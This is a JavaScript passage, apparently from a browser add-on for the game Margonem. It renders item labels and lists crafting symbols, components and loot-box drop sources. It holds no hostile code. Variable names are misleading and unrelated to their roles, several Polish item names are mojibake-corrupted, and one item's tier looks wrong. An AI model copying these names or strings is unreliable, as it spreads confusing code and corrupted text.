  const widgetOpenState = widgetHasActiveIcon ? document.querySelectorAll(".item-id-" + spotWidgetId.id) : spotWidgetId.$[0];

  if (!widgetOpenState) {
    return;
  }

  const activeStashConfigId = [];
  const stashButtonElement = widgetStateConfig.socket_fleeting_legbon ?? widgetStateConfig.socket_injection_legbon ?? widgetStateConfig.legbon_test ?? widgetStateConfig.legbon;

  if (stashButtonElement) {
    const stashStateConfig = String(stashButtonElement).split(",", 1)[0];
    const stashOpenState = spotWidgetElement[stashStateConfig];

    if (stashOpenState) {
      activeStashConfigId.push("<div class=\"mp-basic-label mp-label-legbon\">" + stashOpenState + "</div>");
    }
  }

  if (widgetStateConfig.enhancement_upgrade_lvl >= 0) {
    activeStashConfigId.push("<div class=\"mp-basic-label mp-label-upgrade-level\">" + widgetStateConfig.enhancement_upgrade_lvl + "</div>");
  }

  if (spotWidgetId.cl === 25) {
    const addonWidgetButton = BLESS_KEYS.find(([addonWidgetConfig]) => widgetStateConfig[addonWidgetConfig]);

    if (addonWidgetButton) {
      activeStashConfigId.push("<div class=\"mp-basic-label mp-label-bless\">" + addonWidgetButton[1] + "</div>");
    }
  }

  if ([28, 26].indexOf(spotWidgetId.cl) >= 0 && widgetStateConfig.target_min_lvl) {
    const addonWidgetOpenState = COMP_TIERS[widgetStateConfig.target_min_lvl];
    console.log(addonWidgetOpenState);

    if (addonWidgetOpenState) {
      activeStashConfigId.push("<div class=\"mp-basic-label mp-label-comp\">" + addonWidgetOpenState + "</div>");
    }
  }

  if (spotWidgetId.cl === 16 && widgetStateConfig.lootbox2 && widgetStateConfig.opis) {
    const addonWidgetHtml = widgetStateConfig.opis;
    const globalSearchQuery = addonWidgetHtml.includes("20-100") ? "T1" : addonWidgetHtml.includes("101-200") ? "T2" : addonWidgetHtml.includes("201-300") ? "T3" : null;

    if (globalSearchQuery) {
      activeStashConfigId.push("<div class=\"mp-basic-label mp-label-comp\">" + globalSearchQuery + "</div>");
    }
  }

  if (LEVEL_CLASSES.has(spotWidgetId.cl) && widgetStateConfig.lvl) {
    activeStashConfigId.push("<div class=\"mp-basic-label mp-label-level\">" + widgetStateConfig.lvl + "</div>");
  }

  const hasValidGlobalSearch = widgetStateConfig.leczy ?? widgetStateConfig.perheal ?? widgetStateConfig.fullheal;

  if (spotWidgetId.cl === 16 && hasValidGlobalSearch > 0) {
    activeStashConfigId.push("<div class=\"mp-label-healing\"></div>");
  }

  const chatMessageString = DMG_KEYS.find(chatCommandPrefix => widgetStateConfig[chatCommandPrefix]);

  if (chatMessageString) {
    activeStashConfigId.push("<div class=\"mp-label-damage mp-damage-" + chatMessageString + "\"></div>");
  }

  if (!activeStashConfigId.length) {
    return;
  }

  const chatCommandArguments = activeStashConfigId.join("");

  if (widgetHasActiveIcon) {
    widgetOpenState.forEach(commandTargetNickname => {
      commandTargetNickname.querySelectorAll(REMOVE_SELECTOR).forEach(commandMessageBody => commandMessageBody.remove());
      commandTargetNickname.insertAdjacentHTML("beforeend", chatCommandArguments);
    });
  } else {
    widgetOpenState.querySelectorAll(REMOVE_SELECTOR).forEach(clearedChannelMessage => clearedChannelMessage.remove());
    widgetOpenState.insertAdjacentHTML("beforeend", chatCommandArguments);
  }
}
export function getLocationsListImages() {
  return [2758, 3313, 7849, 5710, 610, 6950, 5662, 3597];
}
export function getSymbols() {
  return [{
    tier: 1,
    target: [8],
    legbon: "puncture",
    components: [54331, 54331, 54332],
    product: 54356
  }, {
    tier: 1,
    target: [8, 11, 13],
    legbon: "lastheal",
    components: [54331, 54332, 54334],
    product: 54351
  }, {
    tier: 1,
    target: [8, 10],
    legbon: "cleanse",
    components: [54331, 54333, 54334],
    product: 54353
  }, {
    tier: 1,
    target: [8, 10, 11],
    legbon: "curse",
    components: [54331, 54333, 54335],
    product: 54347
  }, {
    tier: 1,
    target: [8, 10],
    legbon: "critred",
    components: [54331, 54335, 54335],
    product: 54350
  }, {
    tier: 1,
    target: [8, 10, 13],
    legbon: "verycrit",
    components: [54332, 54332, 54333],
    product: 54346
  }, {
    tier: 1,
    target: [8, 11, 13],
    legbon: "facade",
    components: [54332, 54333, 54335],
    product: 54352
  }, {
    tier: 1,
    target: [8, 13],
    legbon: "holytouch",
    components: [54332, 54334, 54335],
    product: 54349
  }, {
    tier: 1,
    target: [8, 11],
    legbon: "glare",
    components: [54333, 54334, 54334],
    product: 54348
  }, {
    tier: 1,
    target: [8],
    legbon: "anguish",
    components: [54333, 54334, 54335],
    product: 54354
  }, {
    tier: 2,
    target: [8],
    legbon: "puncture",
    components: [54336, 54336, 54337],
    product: 57483
  }, {
    tier: 2,
    target: [8],
    legbon: "lastheal",
    components: [54336, 54337, 54339],
    product: 57478
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "cleanse",
    components: [54336, 54338, 54339],
    product: 57480
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "curse",
    components: [54336, 54338, 54340],
    product: 57474
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "critred",
    components: [54336, 54340, 54340],
    product: 57477
  }, {
    tier: 2,
    target: [8],
    legbon: "verycrit",
    components: [54337, 54337, 54338],
    product: 57473
  }, {
    tier: 2,
    target: [8],
    legbon: "facade",
    components: [54337, 54338, 54340],
    product: 57479
  }, {
    tier: 2,
    target: [8],
    legbon: "holytouch",
    components: [54337, 54339, 54340],
    product: 57476
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "glare",
    components: [54338, 54339, 54339],
    product: 57475
  }, {
    tier: 2,
    target: [8],
    legbon: "anguish",
    components: [54338, 54339, 54340],
    product: 57481
  }, {
    tier: 3,
    target: [8],
    legbon: "puncture",
    components: [54341, 54341, 54342],
    product: 57495
  }, {
    tier: 3,
    target: [8, 14, 29],
    legbon: "lastheal",
    components: [54341, 54342, 54344],
    product: 57490
  }, {
    tier: 3,
    target: [8, 14],
    legbon: "cleanse",
    components: [54341, 54343, 54344],
    product: 57492
  }, {
    tier: 3,
    target: [8, 5, 14],
    legbon: "curse",
    components: [54341, 54343, 54345],
    product: 57486
  }, {
    tier: 3,
    target: [8, 7],
    legbon: "critred",
    components: [54341, 54345, 54345],
    product: 57489
  }, {
    tier: 3,
    target: [8, 7, 29],
    legbon: "verycrit",
    components: [54342, 54342, 54343],
    product: 57485
  }, {
    tier: 3,
    target: [8, 5],
    legbon: "facade",
    components: [54342, 54343, 54345],
    product: 57491
  }, {
    tier: 3,
    target: [8, 5, 7],
    legbon: "holytouch",
    components: [54342, 54344, 54345],
    product: 57488
  }, {
    tier: 3,
    target: [8, 29],
    legbon: "glare",
    components: [54343, 54344, 54344],
    product: 57487
  }, {
    tier: 3,
    target: [8],
    legbon: "anguish",
    components: [54343, 54344, 54345],
    product: 57493
  }];
}
export function getTplsSymbolAndComponents() {
  return [{
    id: 57493,
    name: "Emanujący symbol krwawej udrÄki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ku.gif",
    tier: 3
  }, {
    id: 57487,
    name: "Emanujący symbol oślepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_bl.gif",
    tier: 3
  }, {
    id: 57488,
    name: "Emanujący symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5,7;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_da.gif",
    tier: 3
  }, {
    id: 57491,
    name: "Emanujący symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_fo.gif",
    tier: 3
  }, {
    id: 57485,
    name: "EmanujÄcy symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8,7,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_cbk.gif",
    tier: 3
  }, {
    id: 57489,
    name: "EmanujÄcy symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,7;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ko.gif",
    tier: 3
  }, {
    id: 57486,
    name: "Emanujący symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5,14;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_kl.gif",
    tier: 3
  }, {
    id: 57492,
    name: "Emanujący symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,14;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_po.gif",
    tier: 3
  }, {
    id: 57490,
    name: "Emanujący symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8,14,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_or.gif",
    tier: 3
  }, {
    id: 57495,
    name: "Emanujący symbol przeszywajÄcej skutecznoĹci",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ps.gif",
    tier: 3
  }, {
    id: 57481,
    name: "Stabilny symbol krwawej udręki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ku.gif",
    tier: 2
  }, {
    id: 57475,
    name: "Stabilny symbol oĹlepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_bl.gif",
    tier: 2
  }, {
    id: 57476,
    name: "Stabilny symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_da.gif",
    tier: 2
  }, {
    id: 57479,
    name: "Stabilny symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_fo.gif",
    tier: 2
  }, {
    id: 57473,
    name: "Stabilny symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_cbk.gif",
    tier: 2
  }, {
    id: 57477,
    name: "Stabilny symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ko.gif",
    tier: 2
  }, {
    id: 57474,
    name: "Stabilny symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_kl.gif",
    tier: 2
  }, {
    id: 57480,
    name: "Stabilny symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_po.gif",
    tier: 2
  }, {
    id: 57478,
    name: "Stabilny symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_or.gif",
    tier: 2
  }, {
    id: 57483,
    name: "Stabilny symbol przeszywającej skuteczności",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ps.gif",
    tier: 2
  }, {
    id: 54354,
    name: "Słaby symbol krwawej udręki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ku.gif",
    tier: 2
  }, {
    id: 54348,
    name: "Słaby symbol oślepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_bl.gif",
    tier: 1
  }, {
    id: 54349,
    name: "Słaby symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_da.gif",
    tier: 1
  }, {
    id: 54352,
    name: "SĹaby symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_fo.gif",
    tier: 1
  }, {
    id: 54346,
    name: "Słaby symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_cbk.gif",
    tier: 1
  }, {
    id: 54350,
    name: "SĹaby symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ko.gif",
    tier: 1
  }, {
    id: 54347,
    name: "Słaby symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10,11;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_kl.gif",
    tier: 1
  }, {
    id: 54353,
    name: "Słaby symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_po.gif",
    tier: 1
  }, {
    id: 54351,
    name: "Słaby symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_or.gif",
    tier: 1
  }, {
    id: 54356,
    name: "Słaby symbol przeszywającej skuteczności",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ps.gif",
    tier: 1
  }, {
    id: 54331,
    name: "Słaby stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_steel.gif",
    tier: 1
  }, {
    id: 54332,
    name: "Słaby ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_fire.gif",
    tier: 1
  }, {
    id: 54333,
    name: "Słaby lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_frost.gif",
    tier: 1
  }, {
    id: 54334,
    name: "Słaby elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_light.gif",
    tier: 1
  }, {
    id: 54335,
    name: "Słaby jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_venom.gif",
    tier: 1
  }, {
    id: 54336,
    name: "Stabilny stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_steel.gif",
    tier: 2
  }, {
    id: 54337,
    name: "Stabilny ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_fire.gif",
    tier: 2
  }, {
    id: 54338,
    name: "Stabilny lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_frost.gif",
    tier: 2
  }, {
    id: 54339,
    name: "Stabilny elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_light.gif",
    tier: 2
  }, {
    id: 54340,
    name: "Stabilny jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_venom.gif",
    tier: 2
  }, {
    id: 54341,
    name: "EmanujÄcy stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_steel.gif",
    tier: 3
  }, {
    id: 54342,
    name: "Emanujący ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_fire.gif",
    tier: 3
  }, {
    id: 54343,
    name: "EmanujÄcy lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_frost.gif",
    tier: 3
  }, {
    id: 54344,
    name: "EmanujÄcy elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_light.gif",
    tier: 3
  }, {
    id: 54345,
    name: "Emanujący jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_venom.gif",
    tier: 3
  }];
}
export function getStashComponents() {
  return [{
    tier: 1,
    id: 59447,
    name: "Lekka skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2932;opis=Zawiera losowy komponent, niezbÄdny do utworzenia symbolu ulepszajÄcego ekwipunek na poziomie 20-100.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_06.gif.gif",
    drop: [{
      nick: "Mroczny Patryk",
      lvl: 35,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/bardzozlypatryk.gif"
    }, {
      nick: "Karmazynowy MĹciciel",
      lvl: 45,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/gnom_msciciel.gif"
    }, {
      nick: "ZĹodziej",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zlodziej.gif"
    }, {
      nick: "Zły Przewodnik",
      lvl: 63,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/mnich-zly2.gif"
    }, {
      nick: "Opętany Paladyn",
      lvl: 74,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/opetanypaladyn02.gif"
    }, {
      nick: "Piekielny Kościej",
      lvl: 85,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/piekielny_kosciej.gif"
    }, {
      nick: "Koziec Mąciciel Ĺcieżek",
      lvl: 94,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/koziec_maciciel_sciezek.gif"
    }]
  }, {
    tier: 1,
    id: 59448,
    name: "Lekka skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2933;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Stalowy komponent jest dwukrotnie wiÄksza od pozostałych.[br][br]Po otworzeniu skrzynki, Ĺup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_04.gif.gif",
    drop: [{
      nick: "KotoĹak Tropiciel",
      lvl: 27,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e1/kotolak_lowca.gif"
    }, {
      nick: "SzczÄt alias Gładki",
      lvl: 47,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-szczet.gif"
    }, {
      nick: "Foverk Turrim",
      lvl: 57,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kobold07.gif"
    }, {
      nick: "Podły zbrojmistrz",
      lvl: 82,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magaz_zbrojmistrz.gif"
    }, {
      nick: "Morthen",
      lvl: 89,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krasnolud_boss.gif"
    }, {
      nick: "Leśne Widmo",
      lvl: 92,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif"
    }]
  }, {
    tier: 1,
    id: 59449,
    name: "Lekka skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2934;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Ognisty komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje siÄ zwiÄzany na staĹe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_02.gif.gif",
    drop: [{
      nick: "Shae Phu",
      lvl: 30,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/demonszef.gif"
    }, {
      nick: "Razuglag Oklash",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/razuglag.gif"
    }, {
      nick: "Furruk Kozug",
      lvl: 66,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll12.gif"
    }, {
      nick: "Grabarz Ĺwiątynny",
      lvl: 80,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nieu_mnich_grabarz.gif"
    }, {
      nick: "Nadzorczyni krasnoludĂłw",
      lvl: 88,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nadzorczyni_krasnoludow.gif"
    }]
  }, {
    tier: 1,
    id: 59450,
    name: "Lekka skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2935;opis=Zawiera losowy komponent, niezbÄdny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_01.gif",
    drop: [{
      nick: "Mushita",
      lvl: 23,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/st-puma.gif"
    }, {
      nick: "Władca rzek",
      lvl: 37,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobmag2.gif"
    }, {
      nick: "Agar",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/glut_agar.gif"
    }, {
      nick: "Jotun",
      lvl: 70,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kam_olbrzym-b.gif"
    }, {
      nick: "Wielka Stopa",
      lvl: 82,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wlochacze_wielka_stopa.gif"
    }, {
      nick: "Goplana",
      lvl: 93,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goplana.gif"
    }]
  }, {
    tier: 1,
    id: 59451,
    name: "Lekka skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2936;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszajÄcego ekwipunek na poziomie 20-100. Szansa na Elektryczny komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_03.gif.gif",
    drop: [{
      nick: "Tyrtajos",
      lvl: 42,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dzik.gif"
    }, {
      nick: "Tollok Shimger",
      lvl: 47,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_shimger.gif"
    }, {
      nick: "Vari Kruger",
      lvl: 66,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll11.gif"
    }, {
      nick: "Lisz",
      lvl: 75,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lisz_demilisze.gif"
    }, {
      nick: "Choukker",
      lvl: 84,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif"
    }, {
      nick: "Gnom Figlid",
      lvl: 96,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnom_figlid.gif"
    }]
  }, {
    tier: 1,
    id: 59452,
    name: "Lekka skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2937;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Jadowy komponent jest dwukrotnie wiÄksza od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje siÄ zwiÄzany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_05.gif.gif",
    drop: [{
      nick: "Zorg Jednooki Baron",
      lvl: 33,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-e2-zorg.gif"
    }, {
      nick: "Gobbos",
      lvl: 40,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobsamurai.gif"
    }, {
      nick: "Owadzia Matka",
      lvl: 58,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zadlak-e2-owadzia-matka.gif"
    }, {
      nick: "Tollok Atamatu",
      lvl: 73,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_atamatu.gif"
    }, {
      nick: "Tollok Utumutu",
      lvl: 73,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_utumatu.gif"
    }, {
      nick: "Żelazoręki Ohydziarz",
      lvl: 92,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ugrape2.gif"
    }, {
      nick: "Centaur Zyfryd",
      lvl: 99,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cent-zyfryd.gif"
    }]
  }, {
    tier: 2,
    id: 59455,
    name: "Solidna skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2938;opis=Zawiera losowy komponent, niezbÄdny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_14.gif",
